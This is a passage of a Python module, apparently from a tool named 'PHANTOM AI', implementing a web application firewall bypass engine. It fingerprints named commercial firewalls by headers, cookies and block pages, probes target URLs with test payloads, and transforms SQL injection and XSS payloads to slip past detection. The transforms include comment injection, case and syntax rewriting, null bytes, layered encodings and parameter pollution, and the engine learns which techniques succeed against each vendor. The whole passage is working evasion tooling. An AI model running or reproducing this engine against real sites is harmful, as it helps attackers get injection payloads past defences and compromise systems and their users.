                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.SLOW_RATE,
            ],
        ))

        # Alibaba Cloud WAF
        self._add_signature(WAFSignature(
            name="Alibaba Cloud WAF",
            vendor="Alibaba Cloud",
            behaviour_family=BehaviourFamily.HYBRID,
            header_patterns=[
                ("Server", self._compile(r"Aliyun")),
            ],
            body_patterns=[
                self._compile(r"aliyun"),
            ],
            status_codes={403, 405},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.SLOW_RATE,
            ],
        ))

        # 360 WangZhanBao
        self._add_signature(WAFSignature(
            name="360 WangZhanBao",
            vendor="360 Security",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("X-Powered-By-360WZB", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"360wzb"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.NULL_BYTE,
            ],
        ))

        # Baidu Cloud WAF
        self._add_signature(WAFSignature(
            name="Baidu Cloud WAF",
            vendor="Baidu Inc.",
            behaviour_family=BehaviourFamily.HYBRID,
            header_patterns=[
                ("Server", self._compile(r"yunjiasu-nginx|Baidu")),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.SLOW_RATE,
            ],
        ))

        # ChinaCache
        self._add_signature(WAFSignature(
            name="ChinaCache",
            vendor="ChinaCache",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Powered-By-ChinaCache", self._compile(r".+")),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
            ],
        ))

        # NSFOCUS
        self._add_signature(WAFSignature(
            name="NSFOCUS",
            vendor="NSFOCUS Inc.",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            body_patterns=[
                self._compile(r"nsfocus"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.ALTERNATIVE_SYNTAX,
            ],
        ))

        # Huawei Cloud WAF
        self._add_signature(WAFSignature(
            name="Huawei Cloud WAF",
            vendor="Huawei Cloud",
            behaviour_family=BehaviourFamily.HYBRID,
            header_patterns=[
                ("Server", self._compile(r"HuaweiCloudWAF")),
            ],
            status_codes={403, 418},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.SLOW_RATE,
            ],
        ))

    def get_signature(self, name: str) -> Optional[WAFSignature]:
        """Get WAF signature by name."""
        return self.signatures.get(name.lower())

    def get_all(self) -> Dict[str, WAFSignature]:
        """Get all signatures."""
        return self.signatures.copy()

    def get_by_family(self, family: BehaviourFamily) -> List[WAFSignature]:
        """Get signatures by behaviour family."""
        return [s for s in self.signatures.values() if s.behaviour_family == family]


# =============================================================================
# BYPASS TECHNIQUES IMPLEMENTATION
# =============================================================================

class BypassTechniqueEngine:
    """
    Implementation of various WAF bypass techniques.
    """

    @staticmethod
    def apply_url_encode(payload: str) -> str:
        """URL encode special characters."""
        return quote(payload, safe='')

    @staticmethod
    def apply_double_url_encode(payload: str) -> str:
        """Double URL encode."""
        return quote(quote(payload, safe=''), safe='')

    @staticmethod
    def apply_unicode_encode(payload: str) -> str:
        """Convert to Unicode escape sequences."""
        result = ""
        for char in payload:
            if ord(char) > 127 or char in '<>"\'/\\':
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    @staticmethod
    def apply_html_entity_encode(payload: str) -> str:
        """Convert to HTML entities."""
        entities = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;',
            '/': '&#x2F;',
        }
        for char, entity in entities.items():
            payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def apply_hex_encode(payload: str) -> str:
        """Convert to hex encoding."""
        return ''.join(f'%{ord(c):02X}' for c in payload)

    @staticmethod
    def apply_mixed_case(payload: str) -> str:
        """Apply random mixed case. H4 FIX: Determinism support."""
        # Use deterministic random if in deterministic mode
        rng = get_deterministic_random("waf_bypass") if is_deterministic_mode() else random
        return ''.join(
            c.upper() if rng.random() > 0.5 else c.lower()
            for c in payload
        )

    @staticmethod
    def apply_null_byte(payload: str) -> str:
        """Insert null bytes."""
        return payload.replace(' ', '%00 ')

    @staticmethod
    def apply_tab_newline(payload: str) -> str:
        """Replace spaces with tabs and newlines."""
        replacements = ['\t', '\n', '\r\n', '\r']
        result = payload
        for i, space in enumerate(re.finditer(r' ', payload)):
            if i < len(replacements):
                result = result[:space.start()] + replacements[i % len(replacements)] + result[space.end():]
        return result

    @staticmethod
    def apply_comment_injection(payload: str, context: str = "sql") -> str:
        """Inject comments to break pattern matching."""
        if context == "sql":
            # SQL comment injection
            return payload.replace(' ', '/**/').replace('=', '/**/=/**/')
        elif context == "html":
            # HTML comment injection
            return payload.replace('<', '<!--><')
        return payload

    @staticmethod
    def apply_whitespace_variation(payload: str) -> str:
        """Use various whitespace characters. H4 FIX: Determinism support."""
        whitespaces = [' ', '\t', '\x0b', '\x0c', '\xa0']
        # Use deterministic random if in deterministic mode
        rng = get_deterministic_random("waf_bypass") if is_deterministic_mode() else random
        result = ""
        for char in payload:
            if char == ' ':
                result += rng.choice(whitespaces)
            else:
                result += char
        return result

    @staticmethod
    def apply_string_concatenation(payload: str, context: str = "sql") -> str:
        """Apply string concatenation techniques."""
        if context == "sql":
            # SQL string concatenation
            if "'" in payload:
                return payload.replace("'", "'+'" ).replace(" ", "' + '")
            return payload
        elif context == "js":
            # JavaScript string concatenation
            return payload.replace("'", "'+'" )
        return payload

    @staticmethod
    def apply_alternative_syntax(payload: str, context: str = "sql") -> str:
        """Use alternative syntax for common patterns."""
        if context == "sql":
            replacements = {
                ' OR ': ' || ',
                ' AND ': ' && ',
                '=': ' LIKE ',
                'SELECT': 'SeLeCt',
                'UNION': 'UnIoN',
            }
        elif context == "xss":
            replacements = {
                '<script>': '<ScRiPt>',
                'javascript:': 'JaVaScRiPt:',
                'onerror': 'OnErRoR',
            }
        else:
            return payload

        result = payload
        for old, new in replacements.items():
            result = re.sub(re.escape(old), new, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def apply_function_obfuscation(payload: str) -> str:
        """Obfuscate function calls."""
        # Common SQL function obfuscations
        functions = {
            'CONCAT': 'CONCAT/**/',
            'SUBSTR': 'SUBSTR/**/',
            'CHAR': 'CHAR/**/',
            'HEX': 'HEX/**/',
        }
        result = payload
        for func, obfuscated in functions.items():
            result = re.sub(rf'\b{func}\s*\(', f'{obfuscated}(', result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def apply_parameter_pollution(param_name: str, payload: str) -> List[Tuple[str, str]]:
        """Generate HTTP Parameter Pollution variants."""
        return [
            (param_name, payload),  # Original
            (param_name, "safe"),   # Decoy before
            (param_name, payload),  # Real payload
            (f"{param_name}[]", payload),  # Array notation
            (f"{param_name}[0]", payload),  # Indexed array
        ]

    def apply_technique(
        self,
        technique: BypassTechnique,
        payload: str,
        context: str = "generic",
    ) -> str:
        """Apply a specific bypass technique to a payload."""
        technique_map = {
            BypassTechnique.URL_ENCODE: self.apply_url_encode,
            BypassTechnique.DOUBLE_URL_ENCODE: self.apply_double_url_encode,
            BypassTechnique.UNICODE_ENCODE: self.apply_unicode_encode,
            BypassTechnique.HTML_ENTITY_ENCODE: self.apply_html_entity_encode,
            BypassTechnique.HEX_ENCODE: self.apply_hex_encode,
            BypassTechnique.MIXED_CASE: self.apply_mixed_case,
            BypassTechnique.NULL_BYTE: self.apply_null_byte,
            BypassTechnique.TAB_NEWLINE: self.apply_tab_newline,
            BypassTechnique.WHITESPACE_VARIATION: self.apply_whitespace_variation,
        }

        context_techniques = {
            BypassTechnique.COMMENT_INJECTION: lambda p: self.apply_comment_injection(p, context),
            BypassTechnique.STRING_CONCATENATION: lambda p: self.apply_string_concatenation(p, context),
            BypassTechnique.ALTERNATIVE_SYNTAX: lambda p: self.apply_alternative_syntax(p, context),
            BypassTechnique.FUNCTION_OBFUSCATION: self.apply_function_obfuscation,
        }

        if technique in technique_map:
            return technique_map[technique](payload)
        elif technique in context_techniques:
            return context_techniques[technique](payload)
        else:
            logger.warning(f"Unknown bypass technique: {technique}")
            return payload


# =============================================================================
# WAF BYPASS ENGINE
# =============================================================================

class WAFBypassEngine:
    """
    PHANTOM AI WAF Bypass Engine.

    Enterprise-level WAF detection and bypass using behavioural classification.

    Usage:
        engine = WAFBypassEngine()

        # Detect WAF
        detection = await engine.detect_waf("https://target.com")

        # Get bypass strategies
        strategies = engine.get_bypass_strategies(detection)

        # Apply bypass
        bypassed = engine.apply_bypass(payload, detection)
    """

    VERSION = "3.0.0"

    # Predefined bypass strategies
    STRATEGIES: List[BypassStrategy] = [
        BypassStrategy(
            name="Encoding Cascade",
            techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.MIXED_CASE,
            ],
            description="Progressive encoding with case manipulation",
            success_rate=0.65,
            applicable_families=[
                BehaviourFamily.REGEX_NAIVE,
                BehaviourFamily.SIGNATURE_BASED,
            ],
        ),
        BypassStrategy(
            name="Obfuscation Heavy",
            techniques=[
                BypassTechnique.COMMENT_INJECTION,
                BypassTechnique.WHITESPACE_VARIATION,
                BypassTechnique.FUNCTION_OBFUSCATION,
            ],
            description="Heavy obfuscation for complex WAFs",
            success_rate=0.55,
            applicable_families=[
                BehaviourFamily.REGEX_ADVANCED,
                BehaviourFamily.SIGNATURE_BASED,
            ],
        ),
        BypassStrategy(
            name="Semantic Preserve",
            techniques=[
                BypassTechnique.ALTERNATIVE_SYNTAX,
                BypassTechnique.STRING_CONCATENATION,
            ],
            description="Maintain semantic validity for ML-based WAFs",
            success_rate=0.45,
            applicable_families=[
                BehaviourFamily.MACHINE_LEARNING,
            ],
        ),
        BypassStrategy(
            name="Protocol Abuse",
            techniques=[
                BypassTechnique.CHUNKED_ENCODING,
                BypassTechnique.PARAMETER_POLLUTION,
                BypassTechnique.CONTENT_TYPE_BYPASS,
            ],
            description="HTTP protocol manipulation",
            success_rate=0.50,
            applicable_families=[
                BehaviourFamily.REGEX_ADVANCED,
                BehaviourFamily.HYBRID,
            ],
        ),
        BypassStrategy(
            name="Rate Evasion",
            techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.REQUEST_SPACING,
                BypassTechnique.SESSION_ROTATION,
            ],
            description="Timing-based evasion for rate limiters",
            success_rate=0.70,
            applicable_families=[
                BehaviourFamily.RATE_LIMITING,
                BehaviourFamily.SESSION_TRACKING,
            ],
        ),
        BypassStrategy(
            name="Deep Encode",
            techniques=[
                BypassTechnique.DOUBLE_URL_ENCODE,
                BypassTechnique.HEX_ENCODE,
                BypassTechnique.NULL_BYTE,
            ],
            description="Deep encoding for legacy WAFs",
            success_rate=0.60,
            applicable_families=[
                BehaviourFamily.REGEX_NAIVE,
            ],
        ),
    ]

    def __init__(self):
        self.signature_db = WAFSignatureDatabase()
        self.technique_engine = BypassTechniqueEngine()
        self._bypass_history: Dict[str, List[BypassResult]] = {}
        self._detection_cache: Dict[str, WAFDetectionResult] = {}

        # C1 FIX 2026-02-13: Thread safety for shared state
        self._lock = asyncio.Lock()
        self._sync_lock = threading.Lock()

        # H1 FIX 2026-02-13: Initialize metrics
        self._init_metrics()

        logger.debug(f"[WAFBypassEngine] v{self.VERSION} initialized")

    def _init_metrics(self) -> None:
        """Initialize metrics tracking. H1 FIX 2026-02-13."""
        self._metrics = {
            "detections_attempted": 0,
            "wafs_detected": 0,
            "bypasses_attempted": 0,
            "bypasses_generated": 0,
            "cache_hits": 0,
            "cache_size": 0,
            "by_waf": defaultdict(int),
            "by_technique": defaultdict(int),
            "by_family": defaultdict(int),
        }

    def get_metrics(self) -> dict:
        """Return current metrics. H1 FIX 2026-02-13."""
        metrics = dict(self._metrics)
        metrics["by_waf"] = dict(metrics["by_waf"])
        metrics["by_technique"] = dict(metrics["by_technique"])
        metrics["by_family"] = dict(metrics["by_family"])
        metrics["cache_size"] = len(self._detection_cache)
        metrics["history_entries"] = sum(len(v) for v in self._bypass_history.values())
        return metrics

    def reset_metrics(self) -> None:
        """Reset metrics to initial state. H1 FIX 2026-02-13."""
        self._init_metrics()

    def _prune_cache_if_needed(self) -> None:
        """Prune detection cache if it exceeds limit. H3 FIX 2026-02-13."""
        if len(self._detection_cache) > MAX_CACHE_ENTRIES:
            # Remove oldest entries (by cache_time)
            entries = [
                (k, getattr(v, '_cache_time', 0))
                for k, v in self._detection_cache.items()
            ]
            entries.sort(key=lambda x: x[1])
            entries_to_remove = len(entries) - int(MAX_CACHE_ENTRIES * 0.8)

            for key, _ in entries[:entries_to_remove]:
                del self._detection_cache[key]

            logger.debug(f"[WAF] Pruned {entries_to_remove} cache entries")

    def _prune_history_if_needed(self, waf_key: str) -> None:
        """Prune bypass history if it exceeds limit. H3 FIX 2026-02-13."""
        if waf_key in self._bypass_history:
            if len(self._bypass_history[waf_key]) > MAX_HISTORY_PER_WAF:
                # Keep most recent entries
                self._bypass_history[waf_key] = self._bypass_history[waf_key][-MAX_HISTORY_PER_WAF:]

    async def detect_waf(
        self,
        target_url: str,
        timeout: float = DEFAULT_DETECTION_TIMEOUT,  # M1 FIX: Use constant
        test_payloads: bool = True,
        verify_ssl: bool = True,  # H5 FIX: Make SSL configurable
    ) -> WAFDetectionResult:
        """
        Detect WAF on target URL.

        Uses multiple detection methods:
        1. Header analysis
        2. Cookie analysis
        3. Response body patterns
        4. Test payload responses

        Args:
            target_url: Target URL to check
            timeout: Request timeout
            test_payloads: Whether to send test payloads
            verify_ssl: Whether to verify SSL certificates (default True)

        Returns:
            WAFDetectionResult with detection details
        """
        self._metrics["detections_attempted"] += 1
        result = WAFDetectionResult()

        # Check cache
        cache_key = hashlib.md5(target_url.encode()).hexdigest()
        async with self._lock:
            if cache_key in self._detection_cache:
                cached = self._detection_cache[cache_key]
                if time.time() - getattr(cached, '_cache_time', 0) < CACHE_TTL_SECONDS:
                    self._metrics["cache_hits"] += 1
                    return cached

        try:
            async with httpx.AsyncClient(
                timeout=timeout,
                verify=verify_ssl,  # H5 FIX: Use parameter
                follow_redirects=True,
            ) as client:
                # 1. Normal request
                start_time = time.monotonic()
                response = await client.get(target_url)
                result.response_time_ms = (time.monotonic() - start_time) * 1000
                result.response_size = len(response.text)

                # Analyze response
                self._analyze_headers(response, result)
                self._analyze_cookies(response, result)
                self._analyze_body(response.text, result)

                # 2. Test with suspicious payloads if enabled
                if test_payloads and not result.detected:
                    await self._test_with_payloads(client, target_url, result)

        except httpx.TimeoutException:
            result.detection_methods.append("timeout_analysis")
            result.evidence.append("Request timed out - possible WAF")

        except httpx.HTTPError as e:
            logger.debug(f"[WAFBypass] HTTP error during detection: {e}")

        # Determine behaviour family if detected
        if result.detected and result.waf_name:
            sig = self.signature_db.get_signature(result.waf_name)
            if sig:
                result.behaviour_family = sig.behaviour_family
                result.recommended_techniques = sig.effective_techniques

        # Get recommended techniques based on family
        if result.behaviour_family != BehaviourFamily.UNKNOWN:
            result.recommended_techniques = self._get_techniques_for_family(
                result.behaviour_family
            )

        # Update metrics
        if result.detected:
            self._metrics["wafs_detected"] += 1
            if result.waf_name:
                self._metrics["by_waf"][result.waf_name] += 1
            self._metrics["by_family"][result.behaviour_family.value] += 1

        # Cache result with thread safety (C1 FIX)
        result._cache_time = time.time()
        async with self._lock:
            self._detection_cache[cache_key] = result
            self._prune_cache_if_needed()

        return result

    def _analyze_headers(
        self,
        response: httpx.Response,
        result: WAFDetectionResult,
    ) -> None:
        """Analyze response headers for WAF signatures."""
        headers = dict(response.headers)

        for sig in self.signature_db.signatures.values():
            for header_name, pattern in sig.header_patterns:
                header_value = headers.get(header_name, "")
                if header_value and pattern.search(header_value):
                    result.detected = True
                    result.waf_name = sig.name
                    result.vendor = sig.vendor
                    result.confidence = 0.9
                    result.detection_methods.append("header_analysis")
                    result.evidence.append(f"Header {header_name}: {header_value[:50]}")
                    return None

    def _analyze_cookies(
        self,
        response: httpx.Response,
        result: WAFDetectionResult,
    ) -> None:
        """Analyze cookies for WAF signatures."""
        cookies = {c.name: c.value for c in response.cookies.jar}

        for sig in self.signature_db.signatures.values():
            for pattern in sig.cookie_patterns:
                for cookie_name in cookies:
                    if pattern.search(cookie_name):
                        if not result.detected:
                            result.detected = True
                            result.waf_name = sig.name
                            result.vendor = sig.vendor
                            result.confidence = 0.8
                        result.detection_methods.append("cookie_analysis")
                        result.evidence.append(f"Cookie: {cookie_name}")
                        return None

    def _analyze_body(
        self,
        body: str,
        result: WAFDetectionResult,
    ) -> None:
        """Analyze response body for WAF signatures."""
        for sig in self.signature_db.signatures.values():
            for pattern in sig.body_patterns:
                match = pattern.search(body)
                if match:
                    if not result.detected:
                        result.detected = True
                        result.waf_name = sig.name
                        result.vendor = sig.vendor
                        result.confidence = 0.85
                    result.detection_methods.append("body_analysis")
                    result.evidence.append(f"Body pattern: {match.group()[:50]}")
                    return None

    async def _test_with_payloads(
        self,
        client: httpx.AsyncClient,
        target_url: str,
        result: WAFDetectionResult,
    ) -> None:
        """Test with suspicious payloads to trigger WAF."""
        # M2 FIX 2026-02-13: Use configurable test payloads
        for payload, payload_type in WAF_TEST_PAYLOADS:
            try:
                test_url = f"{target_url}?test={quote(payload)}"
                response = await client.get(test_url)

                # Check for block
                if response.status_code in (403, 406, 429, 503):
                    result.detected = True
                    result.block_type = BlockType.STATUS_CODE
                    result.block_status_code = response.status_code
                    result.detection_methods.append("payload_test")
                    result.evidence.append(f"Blocked {payload_type} with status {response.status_code}")
                    result.confidence = max(result.confidence, 0.9)

                    # Try to identify WAF from block page
                    self._analyze_body(response.text, result)
                    break

            except httpx.HTTPError as e:
                # H2 FIX 2026-02-13: Use module-level logger instead of import
                logger.warning(f"WAF bypass payload test HTTPError: {e}")

    def _get_techniques_for_family(
        self,
        family: BehaviourFamily,
    ) -> List[BypassTechnique]:
        """Get recommended bypass techniques for a behaviour family."""
        family_techniques = {
            BehaviourFamily.REGEX_NAIVE: [
                BypassTechnique.URL_ENCODE,
                BypassTechnique.MIXED_CASE,
                BypassTechnique.WHITESPACE_VARIATION,
            ],
            BehaviourFamily.REGEX_ADVANCED: [
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.COMMENT_INJECTION,
                BypassTechnique.ALTERNATIVE_SYNTAX,
                BypassTechnique.CHUNKED_ENCODING,
            ],
            BehaviourFamily.MACHINE_LEARNING: [
                BypassTechnique.SLOW_RATE,
                BypassTechnique.FUNCTION_OBFUSCATION,
                BypassTechnique.STRING_CONCATENATION,
                BypassTechnique.SESSION_ROTATION,
            ],
            BehaviourFamily.SIGNATURE_BASED: [
                BypassTechnique.DOUBLE_URL_ENCODE,
                BypassTechnique.NULL_BYTE,
                BypassTechnique.PARAMETER_POLLUTION,
                BypassTechnique.HTTP_VERB_TAMPERING,
            ],
            BehaviourFamily.RATE_LIMITING: [
                BypassTechnique.SLOW_RATE,
                BypassTechnique.REQUEST_SPACING,
                BypassTechnique.IP_ROTATION,
            ],
            BehaviourFamily.SESSION_TRACKING: [
                BypassTechnique.SESSION_ROTATION,
                BypassTechnique.USER_AGENT_ROTATION,
            ],
            BehaviourFamily.CHALLENGE_BASED: [
                # Challenges typically require browser automation
                BypassTechnique.SLOW_RATE,
            ],
            BehaviourFamily.HYBRID: [
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.SLOW_RATE,
                BypassTechnique.ALTERNATIVE_SYNTAX,
                BypassTechnique.SESSION_ROTATION,
            ],
        }

        return family_techniques.get(family, [])

    def get_bypass_strategies(
        self,
        detection: WAFDetectionResult,
    ) -> List[BypassStrategy]:
        """
        Get applicable bypass strategies for detected WAF.

        Args:
            detection: WAF detection result

        Returns:
            List of applicable strategies sorted by success rate
        """
        if not detection.detected:
            return self.STRATEGIES  # Return all if no WAF detected

        applicable = []
        for strategy in self.STRATEGIES:
            if detection.behaviour_family in strategy.applicable_families:
                applicable.append(strategy)

        # Sort by success rate
        applicable.sort(key=lambda s: s.success_rate, reverse=True)

        return applicable if applicable else self.STRATEGIES

    def apply_bypass(
        self,
        payload: str,
        detection: WAFDetectionResult,
        context: str = "generic",
        techniques: Optional[List[BypassTechnique]] = None,
    ) -> str:
        """
        Apply bypass techniques to a payload.

        Args:
            payload: Original payload
            detection: WAF detection result
            context: Vulnerability context (sql, xss, etc.)
            techniques: Specific techniques to apply (None = auto)

        Returns:
            Bypassed payload
        """
        self._metrics["bypasses_attempted"] += 1

        if techniques is None:
            techniques = detection.recommended_techniques[:DEFAULT_TOP_TECHNIQUES]  # M1 FIX

        result = payload
        for technique in techniques:
            result = self.technique_engine.apply_technique(technique, result, context)
            self._metrics["by_technique"][technique.value] += 1

        return result

    def generate_bypass_variants(
        self,
        payload: str,
        detection: WAFDetectionResult,
        context: str = "generic",
        max_variants: int = DEFAULT_MAX_VARIANTS,  # M1 FIX
    ) -> List[Tuple[str, List[BypassTechnique]]]:
        """
        Generate multiple bypass variants of a payload.

        Args:
            payload: Original payload
            detection: WAF detection result
            context: Vulnerability context
            max_variants: Maximum variants to generate

        Returns:
            List of (bypassed_payload, techniques_used) tuples
        """
        variants = []

        # Get strategies for this WAF
        strategies = self.get_bypass_strategies(detection)

        for strategy in strategies[:max_variants]:
            bypassed = payload
            for technique in strategy.techniques:
                bypassed = self.technique_engine.apply_technique(
                    technique, bypassed, context
                )
            variants.append((bypassed, strategy.techniques))

        # Add single-technique variants
        for technique in detection.recommended_techniques[:5]:
            bypassed = self.technique_engine.apply_technique(
                technique, payload, context
            )
            if bypassed not in [v[0] for v in variants]:
                variants.append((bypassed, [technique]))

        self._metrics["bypasses_generated"] += len(variants)
        return variants[:max_variants]

    def record_bypass_result(
        self,
        waf_name: str,
        technique: BypassTechnique,
        success: bool,
    ) -> None:
        """
        Record bypass attempt result for learning.

        This helps improve bypass recommendations over time.

        Args:
            waf_name: Name of the WAF
            technique: Technique that was tried
            success: Whether bypass was successful
        """
        # C1 FIX 2026-02-13: Thread-safe history mutation
        with self._sync_lock:
            key = waf_name.lower()
            if key not in self._bypass_history:
                self._bypass_history[key] = []

            self._bypass_history[key].append(BypassResult(
                original_payload="",
                bypassed_payload="",
                technique=technique,
                success=success,
            ))

            # H3 FIX: Prune history if too large
            self._prune_history_if_needed(key)

            # Update signature if we have enough data (M1 FIX: use constants)
            sig = self.signature_db.get_signature(waf_name)
            if sig and len(self._bypass_history[key]) >= MIN_HISTORY_FOR_LEARNING:
                # Calculate success rate for this technique
                technique_results = [
                    r for r in self._bypass_history[key]
                    if r.technique == technique
                ]
                if len(technique_results) >= MIN_TECHNIQUE_RESULTS:
                    success_rate = sum(1 for r in technique_results if r.success) / len(technique_results)

                    if success_rate >= 0.7 and technique not in sig.effective_techniques:
                        sig.effective_techniques.append(technique)
                    elif success_rate <= 0.3 and technique not in sig.ineffective_techniques:
                        sig.ineffective_techniques.append(technique)

    def get_waf_info(self, waf_name: str) -> Optional[Dict[str, Any]]:
        """
        Get detailed information about a WAF.

        Args:
            waf_name: Name of the WAF

        Returns:
            Dictionary with WAF details or None
        """
        sig = self.signature_db.get_signature(waf_name)
        if not sig:
            return None

        return {
            "name": sig.name,
            "vendor": sig.vendor,
            "behaviour_family": sig.behaviour_family.value,
            "block_types": [t.value for t in sig.block_types],
            "effective_techniques": [t.value for t in sig.effective_techniques],
            "ineffective_techniques": [t.value for t in sig.ineffective_techniques],
            "documentation_url": sig.documentation_url,
            "notes": sig.notes,
        }

    def get_all_waf_names(self) -> List[str]:
        """Get names of all known WAFs."""
        return list(self.signature_db.signatures.keys())

    def get_statistics(self) -> Dict[str, Any]:
        """Get WAF bypass engine statistics."""
        total_signatures = len(self.signature_db.signatures)

        families = {}
        for sig in self.signature_db.signatures.values():
            family = sig.behaviour_family.value
            families[family] = families.get(family, 0) + 1

        return {
            "total_waf_signatures": total_signatures,
            "by_behaviour_family": families,
            "total_bypass_strategies": len(self.STRATEGIES),
            "cached_detections": len(self._detection_cache),
            "bypass_history_entries": sum(len(v) for v in self._bypass_history.values()),
        }


# =============================================================================
# SINGLETON AND FACTORY
# =============================================================================

_engine_instance: Optional[WAFBypassEngine] = None
_engine_lock = asyncio.Lock()
_sync_engine_lock = threading.Lock()  # C2 FIX 2026-02-13


async def get_waf_bypass_engine() -> WAFBypassEngine:
    """Get singleton WAFBypassEngine instance (async)."""
    global _engine_instance

    async with _engine_lock:
        if _engine_instance is None:
            _engine_instance = WAFBypassEngine()
            logger.debug(
                f"[WAFBypassEngine] Initialized with "
                f"{len(_engine_instance.signature_db.signatures)} signatures"
            )

        return _engine_instance


def get_waf_bypass_engine_sync() -> WAFBypassEngine:
    """Get WAFBypassEngine instance (sync). C2 FIX 2026-02-13: Thread-safe."""
    global _engine_instance

    # C2 FIX: Use lock to prevent race condition
    with _sync_engine_lock:
        if _engine_instance is None:
            _engine_instance = WAFBypassEngine()
            logger.debug(
                f"[WAFBypassEngine] Initialized with "
                f"{len(_engine_instance.signature_db.signatures)} signatures"
            )

    return _engine_instance


# Export
__all__ = [
    "BehaviourFamily",
    "BypassTechnique",
    "BlockType",
    "WAFSignature",
    "WAFDetectionResult",
    "BypassResult",
    "BypassStrategy",
    "WAFSignatureDatabase",
    "BypassTechniqueEngine",
    "WAFBypassEngine",
    "get_waf_bypass_engine",
    "get_waf_bypass_engine_sync",
]
